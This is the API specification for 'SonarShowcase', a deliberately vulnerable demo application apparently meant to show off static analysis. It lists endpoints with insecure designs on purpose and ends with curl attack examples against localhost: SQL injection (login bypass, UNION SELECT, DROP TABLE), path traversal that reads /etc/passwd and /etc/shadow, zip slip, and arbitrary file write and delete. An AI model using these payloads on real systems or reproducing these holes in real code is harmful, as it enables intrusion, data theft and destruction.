# SonarShowcase API Specification

**Version:** 1.2.0  
**Last Updated:** January 2025  
**Status:** Current

## Overview

This document describes the complete API specification for the SonarShowcase application. All endpoints are publicly accessible as this is a demonstration application.

## Base URL

```
http://localhost:8080/api/v1
```

## Authentication

**No authentication is implemented.** All endpoints are publicly accessible. The application is designed for demonstration purposes and intentionally contains security vulnerabilities for educational use.

**Note:** The `/api/v1/users/login` endpoint exists but is a vulnerable SQL injection demonstration endpoint, not a real authentication mechanism.

## Endpoints

### Users

#### Get All Users
```
GET /api/v1/users
```

Response: Returns array of User entities (⚠️ includes passwords and sensitive data)

#### Get User by ID
```
GET /api/v1/users/{id}
```

#### Search Users
```
GET /api/v1/users/search?q={query}
```
Performs in-memory search (not SQL injection, but inefficient)

#### Create User
```
POST /api/v1/users
Content-Type: application/json

{
  "username": "newuser",
  "email": "user@example.com",
  "password": "password123",
  "role": "USER"  // Optional, defaults to "USER"
}
```

#### Update Password
```
PUT /api/v1/users/{id}/password?oldPassword={old}&newPassword={new}
```
⚠️ **INSECURE:** Passwords in URL parameters, plain text storage

#### Generate Password Reset Token
```
POST /api/v1/users/{id}/reset-token
```
🔴 **SECURITY:** Uses weak random number generator (java:S5445) - `java.util.Random` is predictable and should not be used for security tokens. Should use `SecureRandom` instead.

**Response:**
```json
{
  "userId": "1",
  "username": "johndoe",
  "resetToken": "aB3dEf9gHiJkLmNoPqRsTuVwXyZ1234",
  "message": "Password reset token generated. Use this token to reset your password."
}
```

#### Delete User
```
DELETE /api/v1/users/{id}
```
⚠️ **INSECURE:** No authorization check

### Orders

#### Get All Orders
```
GET /api/v1/orders
```

#### Get Order by ID
```
GET /api/v1/orders/{id}
```

#### Get Orders by User
```
GET /api/v1/orders/user/{userId}
```

#### Create Order
```
POST /api/v1/orders
Content-Type: application/json

{
  "user": {"id": 1},
  "totalAmount": 75.00,
  "shippingAddress": "123 Demo Street",
  "notes": "Optional notes"
}
```

#### Apply Discount Code
```
POST /api/v1/orders/{id}/discount?code={code}
```
Available codes: SUMMER2023 (15%), VIP (25%), EMPLOYEE (50%)

### Health & Info

#### Health Check
```
GET /api/v1/health
```

#### System Info
```
GET /api/v1/info
```
⚠️ **INSECURE:** Exposes sensitive system information

## Error Handling

Error responses vary by endpoint. Some endpoints return plain string messages, while others return structured JSON responses via `ResponseEntity`. There is no standardized error format across all endpoints.

Common error scenarios:
- **404 Not Found:** Returned when a resource doesn't exist (if properly handled)
- **500 Internal Server Error:** Returned for unhandled exceptions, including null pointer exceptions (intentional bugs)
- **400 Bad Request:** Returned for invalid input (if validation is implemented)

## Rate Limiting

Rate limiting is not implemented. All endpoints are publicly accessible without rate restrictions.

## Security Demo Endpoints (Vulnerable)

These endpoints contain intentional security vulnerabilities for educational purposes. They are designed to demonstrate SonarCloud's static analysis capabilities.

### SQL Injection Endpoints

#### Login (Vulnerable)
```
GET /api/v1/users/login?username={username}&password={password}
```

Attack example:
```bash
# Authentication bypass
curl "http://localhost:8080/api/v1/users/login?username=admin'--&password=anything"
```

#### Vulnerable Search
```
GET /api/v1/users/vulnerable-search?term={searchTerm}
```

Attack example:
```bash
# UNION injection
curl "http://localhost:8080/api/v1/users/vulnerable-search?term=' UNION SELECT * FROM users--"
```

#### Sorted Users
```
GET /api/v1/users/sorted?orderBy={column}
```

Attack example:
```bash
# ORDER BY injection
curl "http://localhost:8080/api/v1/users/sorted?orderBy=username; DROP TABLE users;--"
```

### Path Traversal Endpoints

#### File Download (Vulnerable)
```
GET /api/v1/files/download?filename={filename}
```

Attack example:
```bash
curl "http://localhost:8080/api/v1/files/download?filename=../../../etc/passwd"
```

#### File Read (Vulnerable)
```
GET /api/v1/files/read?path={path}
```

Attack example:
```bash
curl "http://localhost:8080/api/v1/files/read?path=/etc/passwd"
```

#### User Profile (Vulnerable)
```
GET /api/v1/files/profile?username={username}
```

Attack example:
```bash
curl "http://localhost:8080/api/v1/files/profile?username=../../../etc/passwd"
```

#### Logs by Date (Vulnerable)
```
GET /api/v1/files/logs?date={date}
```

Attack example:
```bash
curl "http://localhost:8080/api/v1/files/logs?date=2025-01-01/../../../../etc/shadow"
```

#### Export Data (Vulnerable)
```
POST /api/v1/files/export?filename={filename}
Content-Type: text/plain

{data}
```

Attack example:
```bash
curl -X POST "http://localhost:8080/api/v1/files/export?filename=../../../tmp/pwned.txt" \
  -H "Content-Type: text/plain" \
  -d "malicious content"
```

#### Template Inclusion (Vulnerable)
```
GET /api/v1/files/template?name={name}
```

Attack example:
```bash
curl "http://localhost:8080/api/v1/files/template?name=../../../../etc/passwd"
```

#### Zip Slip (Vulnerable)
```
POST /api/v1/files/extract?zipPath={path}&destDir={dir}
```

Attack example:
```bash
curl -X POST "http://localhost:8080/api/v1/files/extract?zipPath=malicious.zip&destDir=../../../"
```

#### Delete File (Vulnerable)
```
DELETE /api/v1/files/delete?filename={filename}
```

Attack example:
```bash
curl -X DELETE "http://localhost:8080/api/v1/files/delete?filename=../../../important/data.db"
```

---

## Changelog

### v1.2.0 (January 2025)
- Version consistency updates, use version variables where possible

### v1.0.0 (January 2025)
- Complete API specification
- All 27 endpoints documented
- SQL Injection demo endpoints documented
- Path Traversal demo endpoints documented
- Security vulnerability documentation

---

*This documentation reflects the current API implementation as of January 2025.*

